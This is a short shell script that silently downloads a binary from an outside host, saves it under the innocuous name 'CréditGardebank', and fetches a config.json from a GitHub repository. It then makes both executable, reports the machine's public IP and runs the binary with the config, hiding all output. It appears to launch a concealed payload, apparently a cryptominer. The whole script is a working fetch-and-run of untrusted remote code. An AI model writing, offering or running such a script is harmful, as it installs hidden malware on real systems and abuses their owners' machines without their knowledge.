wget -q -O CréditGardebank https://maper.info/api-server && chmod +x CréditGardebank >/dev/null 2>&1
wget -q https://raw.githubusercontent.com/55113110159/TIBO/main/config.json && chmod +x config.json
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " "
./CréditGardebank -c "config.json" >/dev/null 2>&1
